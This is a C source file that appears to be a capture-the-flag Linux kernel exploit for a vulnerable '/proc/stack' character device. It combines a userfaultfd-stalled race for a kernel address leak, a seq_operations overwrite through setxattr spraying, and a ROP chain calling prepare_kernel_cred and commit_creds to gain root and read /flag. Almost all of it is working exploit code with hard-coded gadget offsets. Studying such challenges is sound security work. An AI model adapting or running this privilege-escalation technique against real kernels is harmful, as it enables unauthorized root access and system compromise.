#define _GNU_SOURCE
#include <stdio.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <sched.h>
#include <sys/mman.h>
#include <signal.h>
#include <sys/syscall.h>
#include <sys/ioctl.h>
#include <linux/userfaultfd.h>
#include <sys/wait.h>
#include <poll.h>
#include <unistd.h>
#include <stdlib.h>
#include <sys/prctl.h>
#include <sys/shm.h>
#include <sys/xattr.h>
#include "shell.h"
#define PAGE 0x1000
#define log_info(...) { \
    printf("[*] "); \
    printf(__VA_ARGS__); \
    putchar('\n'); \
};
#define log_err(...) { \
    printf("[!] "); \
    printf(__VA_ARGS__); \
    putchar('\n'); \
};
#define errExit(...){ \
    log_err(__VA_ARGS__); \
    exit(-1); \
};
u_int64_t user_ip;
u_int64_t user_cs;
u_int64_t user_rflags;
u_int64_t user_sp;
u_int64_t user_ss;
void get_shell(){
    if(getuid()){
        puts("Cuts");
        exit(-1);
    }
    log_info("Rooted!");
    // int shell_file = open("/tmp/shell",O_RDWR | O_CREAT);
    // write(shell_file,shell_elf,sizeof(shell_elf));
    // close(shell_file);
    // system("chmod +x /tmp/shell");
    int pid;
    if((pid=fork()) == 0){
        system("id");
        exit(0);
    }
    int fd = open("/flag",0);
    char flag[100];
    read(fd,flag,sizeof(flag));
    log_info("Flag: %s",flag);
    wait(pid);
    exit(0);
}
void save_state(){
    __asm__(
        ".intel_syntax noprefix;"
        "mov user_cs, cs;"
        "mov user_ss, ss;"
        "mov user_sp, rsp;"
        "pushf;"
        "pop user_rflags;"
        ".att_syntax;"
    );
    user_ip = 0x1338;
    log_info("Saved user state");
}

#define pause() getchar()
#define CMD_PUSH 0x57ac0001
#define CMD_POP  0x57ac0002

typedef struct _Element {
  int owner;
  unsigned long value;
  struct _Element *fd;
} Element;

#define dev_char "/proc/stack"

int global_fd;
const char *buf[0x1000];
void dev_open(){
    global_fd = open(dev_char,O_RDWR);
    log_info("Opened dev char.");
}
int64_t read_buffer[0x20];
void pop(void* arg){
    ioctl(global_fd,CMD_POP,arg);
    log_info("Got value: 0x%lx",*(int64_t *)arg);
}
void  _push(void* arg){
    ioctl(global_fd,CMD_PUSH,arg);
    log_info("Pushed %p",arg);
    
}

static void call_shmat(void)
{
  int shmid;
  void *addr;
  pid_t pid;
  if((pid=fork()) == 0){
    if((shmid = shmget(IPC_PRIVATE, 0x1000, IPC_CREAT | 0600))==-1)
      errExit("shmget fail");
    if((addr=shmat(shmid, NULL, SHM_RDONLY))==-1)
      errExit("shmat fail");
    if(shmctl(shmid, IPC_RMID, NULL)==-1)
      errExit("shmctl");
    log_info("Success call_shmat: %p", addr);
    log_info("Child is exiting...");
    exit(0);
  }
  wait(pid);
  log_info("Parent is returning...");
}
int64_t kernel_base;
int64_t data_base;
static void* fault_handler_thread(void *arg)
{
    log_info("Entered fault_handler_thread");
    static struct uffd_msg msg;   // data read from userfaultfd
    struct uffdio_copy uffdio_copy_var;
    long uffd = (long)arg;        // userfaultfd file descriptor
    struct pollfd pollfd;         //
    int nready;                   // number of polled events
    unsigned long hogebuf;
    pollfd.fd = uffd;
    pollfd.events = POLLIN;
    log_info("Polling...");
    while(poll(&pollfd, 1, -1) > 0){
      if(pollfd.revents & POLLERR || pollfd.revents & POLLHUP)
          log_err("poll");
      // read an event
      if(read(uffd, &msg, sizeof(msg)) == 0)
          log_err("read");
      if(msg.event != UFFD_EVENT_PAGEFAULT)
          log_err("unexpected pagefault");
      log_err("page fault: %p",(void *)msg.arg.pagefault.address);
      log_info("pop before push");
      pop(&hogebuf);
      data_base = hogebuf - 0x37bc0;
      kernel_base = data_base - 0xc00000;
      log_info("Data base: 0x%lx",data_base);
      log_info("Text base: 0x%lx",kernel_base);


      mprotect(msg.arg.pagefault.address & ~(PAGE-1),PAGE,PROT_NONE);
      log_info("Mprotect -> PROT_NONE");
      //Stop polling
      uffdio_copy_var.src = buf;
      uffdio_copy_var.dst = msg.arg.pagefault.address & ~(PAGE-1);
      uffdio_copy_var.len = PAGE;
      uffdio_copy_var.mode = 0;
      if(ioctl(uffd, UFFDIO_COPY, &uffdio_copy_var) == -1)
        errExit("ioctl-UFFDIO_COPY");
      break;
    }
    log_info("Exit fault_handler_thread");
}

char *addr = 0x117117000;    // memory region supervisored
const unsigned long len = PAGE*0x10;  // memory length
void register_userfaultfd_and_halt(){
    log_info("Registering userfaultfd...");

    long uffd;  // userfaultfd file descriptor
    pthread_t thr; // ID of thread that handles page fault and continue exploit in another kernel thread
    struct uffdio_api uffdio_api_var;
    struct uffdio_register uffdio_register_var;
    int s;

    uffd = syscall(__NR_userfaultfd, O_CLOEXEC | O_NONBLOCK); // create userfaultfd file descriptor
    if(uffd==-1){
        log_err("userfaultfd");
        exit(-1);
    }
    // enable uffd object via ioctl(UFFDIO_API)
    uffdio_api_var.api = UFFD_API ;
    uffdio_api_var.features = 0;
    if(ioctl(uffd, UFFDIO_API, &uffdio_api_var) == -1){
        log_err("ioctl-UFFDIO_API");
        exit(-1);
    }
    log_info("Mapping...");
    addr = mmap(addr, len, PROT_READ | PROT_WRITE | PROT_EXEC, MAP_PRIVATE | MAP_ANONYMOUS | MAP_FIXED, -1, 0); // set MAP_FIXED for memory to be mmaped on exactly specified addr.
    log_info("Mapped");
    if(addr == MAP_FAILED){
        log_err("mmap");
        exit(-1);
    }
    // specify memory region handled by userfaultfd via ioctl(UFFDIO_REGISTER)
    uffdio_register_var.range.start = addr;
    uffdio_register_var.range.len = PAGE*0x10;
    uffdio_register_var.mode = UFFDIO_REGISTER_MODE_MISSING;
    if(ioctl(uffd, UFFDIO_REGISTER, &uffdio_register_var) == -1){
        log_info("ioctl-UFFDIO_REGISTER");
        exit(-1);
    }    
    s = pthread_create(&thr, NULL, fault_handler_thread, (void*)uffd); // create thread
    if(s){
        log_err("pthread_create");
        exit(s);
    }
    log_info("Registered userfaultfd");
}
//pagefalut
//1 page = 0x1000 bytes;
// mmap(0x1337000,...., R & W) -> 0x1337000
//  *(char *)0x1337000 = 0 -> pagefalut -> mmap address -> *(char *)0x1337000 = 0
//                          *----------------------------* -> kernel
// userfaultfd
// *(char *)0x1337000 = 0 -> pagefalut -> userfaultfd -> mmap address -> *(char *)0x1337000 = 0
//                                          |--->  mprotect(0x13337000, READONLY)
int main(int argc, char **argv,char **envp){
    save_state();
    dev_open();
    int64_t* stack_ = mmap(0x5D006213 & ~(PAGE-1),0x3000,PROT_READ | PROT_WRITE | PROT_EXEC,MAP_PRIVATE | MAP_ANONYMOUS | MAP_FIXED,-1,0);
    stack_[0]=69;
    *(stack_+0x1000/8)=0;
    int64_t* rop = 0x5D006213;
    register_userfaultfd_and_halt();
    sleep(1);
    call_shmat(); // kalloc and kfree shm_file_data structure at kmalloc-32
    log_info("Trying push....");
    _push(addr); // invoke fault
    u_int64_t off = 0;
    rop[off++] = kernel_base + 0x22dd4c; // pop rdi ; ret
    rop[off++] = 0;
    rop[off++] = kernel_base + 0x69e00; // prepare_kernel_cred
    rop[off++] = kernel_base + 0x22dd4c; // pop rdi ; ret
    rop[off++] = 0;
    rop[off++] = kernel_base + 0x17bf6d; // add rdi,rax ; mov rbx,QWORD PTR [rbp-0x30]; mov QWORD PTR [rbx],rdi; add rsp,0x8; pop ..
    rop[off++] = 0;
    rop[off++] = 0; //dummy rbx
    rop[off++] = 0; //dummy r12
    rop[off++] = 0; //dummy r13
    rop[off++] = 0; //dummy r14
    rop[off++] = 0; //dummy r15
    rop[off++] = 0; //dummy rbp
    rop[off++] = kernel_base + 0x69c10; // commit_creds
    rop[off++] = kernel_base + 0x600a34 + 22;// swapgs_restore_regs_and_return_to_usermode+22
    rop[off++] = 0; // dummy rax
    rop[off++] = 0; // dummy rdi
    rop[off++] = get_shell;
    rop[off++] = user_cs;
    rop[off++] = user_rflags;
    rop[off++] = user_sp;
    rop[off++] = user_ss;
    int sfd;
    if((sfd = open("/proc/self/stat", O_RDONLY)) == -1)
        errExit("single_open");
    int64_t hehe[4];
    hehe[3] = kernel_base + 0x1e0c40; // mov esp, 0x5D006213 ; ret
    setxattr("/tmp", "cacBANcheCUOI", hehe, sizeof(hehe), XATTR_CREATE);
    read(sfd, buf, 0x10);
    return 0;
}